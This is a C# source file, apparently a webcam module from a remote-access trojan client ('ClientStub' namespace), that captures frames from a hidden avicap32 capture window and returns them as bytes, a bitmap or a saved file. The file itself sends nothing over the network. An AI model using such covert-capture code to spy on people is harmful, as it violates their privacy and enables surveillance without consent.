using System;
using System.Collections;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;
using System.Drawing.Imaging;

namespace ClientStub.Helpers.Services.WebCamera
{
    public class Camera
    {
        /// <summary>
        /// Timur Kovalev (http://www.creativecodedesign.com):
        /// This class provides a method of capturing a webcam image via avicap32.dll api.
        /// </summary>    
        public class ccWebCam
        {
            #region *** PInvoke Stuff - methods to interact with capture window ***
            [DllImport("user32", EntryPoint = "SendMessage")]
            static extern int SendMessage(int hWnd, uint Msg, int wParam, int lParam);
            [DllImport("avicap32.dll", EntryPoint = "capCreateCaptureWindowA")]
            static extern int capCreateCaptureWindowA(string lpszWindowName, int dwStyle,
                int X, int Y, int nWidth, int nHeight, int hwndParent, int nID);
            const int WM_CAP_CONNECT = 1034;
            const int WM_CAP_DISCONNECT = 1035;
            const int WM_CAP_COPY = 1054;
            const int WM_CAP_GET_FRAME = 1084;
            #endregion
            /// <summary>
            /// Captures a frame from the webcam and returns the byte array associated
            /// with the captured image
            /// </summary>
            /// <param name="connectDelay">number of milliseconds to wait between connect 
            /// and capture - necessary for some cameras that take a while to 'warm up'</param>
            /// <returns>byte array representing a bitmp or null (if error or no webcam)</returns>
            public static byte[] Capture(int connectDelay = 500)
            {
                Clipboard.Clear();                                              // clear the clipboard
                int hCaptureWnd = capCreateCaptureWindowA("ccWebCam", 0, 0, 0,  // create the hidden capture window
                    350, 350, 0, 0);
                SendMessage(hCaptureWnd, WM_CAP_CONNECT, 0, 0);                 // send the connect message to it
                Thread.Sleep(connectDelay);                                     // sleep the specified time
                SendMessage(hCaptureWnd, WM_CAP_GET_FRAME, 0, 0);               // capture the frame
                SendMessage(hCaptureWnd, WM_CAP_COPY, 0, 0);                    // copy it to the clipboard
                SendMessage(hCaptureWnd, WM_CAP_DISCONNECT, 0, 0);              // disconnect from the camera
                Bitmap bitmap = (Bitmap)Clipboard.GetDataObject().GetData(DataFormats.Bitmap);  // copy into bitmap
                if (bitmap == null)
                    return null;
                using (MemoryStream stream = new MemoryStream())
                {
                    bitmap.Save(stream, ImageFormat.Bmp);    // get bitmap bytes
                    return stream.ToArray();
                }
            }
            /// <summary>
            /// Captures a frame from the webcam and returns the byte array associated
            /// with the captured image. Runs in a newly-created STA thread which is 
            /// required for this method of capture
            /// </summary>
            /// <param name="connectDelay">number of milliseconds to wait between connect 
            /// and capture - necessary for some cameras that take a while to 'warm up'</param>
            /// <returns>byte array representing a bitmp or null (if error or no webcam)</returns>
            public static byte[] CaptureSTA(int connectDelay = 500)
            {
                byte[] bytes = null;
                Thread catureThread = new Thread(() =>
                {
                    bytes = Capture(connectDelay);
                });
                catureThread.SetApartmentState(ApartmentState.STA);
                catureThread.Start();
                catureThread.Join();
                return bytes;
            }
            /// <summary>
            /// Captures a frame from the webcam and returns the byte array associated
            /// with the captured image. The image is also stored in a file
            /// </summary>
            /// <param name="filePath">path the file wher ethe image will be saved</param>
            /// <param name="connectDelay">number of milliseconds to wait between connect 
            /// and capture - necessary for some cameras that take a while to 'warm up'</param>
            /// <returns>true on success, false on failure</returns>
            public static bool Capture(string filePath, int connectDelay = 500)
            {
                byte[] capture = ccWebCam.Capture(connectDelay);
                if (capture != null)
                {
                    File.WriteAllBytes(filePath, capture);
                    return true;
                }
                return false;
            }
            /// <summary>
            /// Captures a frame from the webcam and returns the byte array associated
            /// with the captured image. The image is also stored in a file
            /// </summary>
            /// <param name="filePath">path the file wher ethe image will be saved</param>
            /// <param name="connectDelay">number of milliseconds to wait between connect 
            /// and capture - necessary for some cameras that take a while to 'warm up'</param>
            /// <returns>true on success, false on failure</returns>
            public static bool CaptureSTA(string filePath, int connectDelay = 500)
            {
                bool success = false;
                Thread catureThread = new Thread(() =>
                {
                    success = Capture(filePath, connectDelay);
                });
                catureThread.SetApartmentState(ApartmentState.STA);
                catureThread.Start();
                catureThread.Join();
                return success;
            }

            public static Bitmap CaptureBitmap(int connectDelay = 2500)
            {
                try
                {
                    Clipboard.Clear();                                              // clear the clipboard
                    int hCaptureWnd = capCreateCaptureWindowA("ccWebCam", 0, 0, 0,  // create the hidden capture window
                        350, 350, 0, 0);
                    SendMessage(hCaptureWnd, WM_CAP_CONNECT, 0, 0);                 // send the connect message to it
                    Thread.Sleep(connectDelay);                                     // sleep the specified time
                    SendMessage(hCaptureWnd, WM_CAP_GET_FRAME, 0, 0);               // capture the frame
                    SendMessage(hCaptureWnd, WM_CAP_COPY, 0, 0);                    // copy it to the clipboard
                    SendMessage(hCaptureWnd, WM_CAP_DISCONNECT, 0, 0);              // disconnect from the camera
                    Bitmap bitmap = (Bitmap)Clipboard.GetDataObject().GetData(DataFormats.Bitmap);  // copy into bitmap
                    if (bitmap != null)
                    {
                        MessageBox.Show("PICTURE RECIEVED!");
                        return bitmap;
                    }
                    else
                    {
                        MessageBox.Show("PICTURE NULL!");
                        return null;
                    }
                }
                catch(Exception ex)
                {
                    MessageBox.Show(ex.ToString(), "JDOKSda");
                    return null;
                }
            }
        }
    }
}
